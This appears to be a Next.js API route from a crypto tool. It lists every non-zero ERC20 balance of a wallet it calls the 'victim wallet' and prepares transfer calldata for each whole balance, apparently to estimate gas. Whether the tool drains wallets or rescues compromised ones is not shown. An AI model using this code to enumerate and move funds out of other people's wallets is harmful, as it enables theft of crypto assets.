import { Alchemy, Network } from 'alchemy-sdk';
import { NextRequest, NextResponse } from 'next/server';
import { encodeFunctionData, formatUnits, fromHex, isAddress } from 'viem';

import { ALCHEMY_BASE_SETTINGS, ALCHEMY_NETWORKS } from '@/configs/alchemy';
import ERC20_ABI from '@/constants/abis/erc20.json';
import { ITokenMetadata } from '@/types/tokens';

export const GET = async (
  request: NextRequest,
  { params }: { params: { address: `0x${string}` } },
) => {
  const { address: victimWalletAddress } = params;
  const chainIdStr = request.nextUrl.searchParams.get('chainId');

  if (!chainIdStr || !victimWalletAddress) {
    return NextResponse.json(
      { error: 'Chain ID and victim wallet address are required' },
      { status: 400 },
    );
  }

  if (!isAddress(victimWalletAddress)) {
    return NextResponse.json(
      { error: 'Invalid wallet address' },
      { status: 400 },
    );
  }

  const alchemy = new Alchemy({
    ...ALCHEMY_BASE_SETTINGS,
    network:
      ALCHEMY_NETWORKS[+chainIdStr as keyof typeof ALCHEMY_NETWORKS] ||
      Network.ETH_MAINNET,
  });

  if (!alchemy) {
    return NextResponse.json(
      { error: 'Alchemy is not initialized' },
      { status: 500 },
    );
  }

  try {
    const tokensWithMetadata: ITokenMetadata[] = [];

    const erc20Balances =
      await alchemy.core.getTokenBalances(victimWalletAddress);

    await Promise.all(
      erc20Balances.tokenBalances.map(async (token: any) => {
        const balance = BigInt(token.tokenBalance || '0');
        if (balance === BigInt(0)) return;

        const metadata = await alchemy.core.getTokenMetadata(
          token.contractAddress,
        );

        const tokenMetadata: ITokenMetadata = {
          type: 'erc20',
          address: token.contractAddress,
          info: `ERC20 - ${token.contractAddress || metadata.symbol || metadata.name}`?.toLowerCase(),
          symbol: metadata.symbol || '',
          amount: formatUnits(
            fromHex(token.tokenBalance || '0x00', 'bigint'),
            metadata.decimals || 18,
          ),
          amountBigInt: fromHex(
            token.tokenBalance || '0x00',
            'bigint',
          ).toString(),
          decimals: metadata.decimals || 18,
          toEstimate: {
            from: victimWalletAddress as `0x${string}`,
            to: token.contractAddress as `0x${string}`,
            data: encodeFunctionData({
              abi: ERC20_ABI,
              functionName: 'transfer',
              args: [
                '0x0000000000000000000000000000000000000000',
                token.tokenBalance,
              ],
            }) as `0x${string}`,
          },
        };

        tokensWithMetadata.push(tokenMetadata);
      }),
    );

    return NextResponse.json(tokensWithMetadata, { status: 200 });
  } catch (e) {
    console.error(`Error fetching assets of victim wallet: ${e}`);
    return NextResponse.json(
      { error: `Error fetching assets of victim wallet: ${e}` },
      { status: 500 },
    );
  }
};
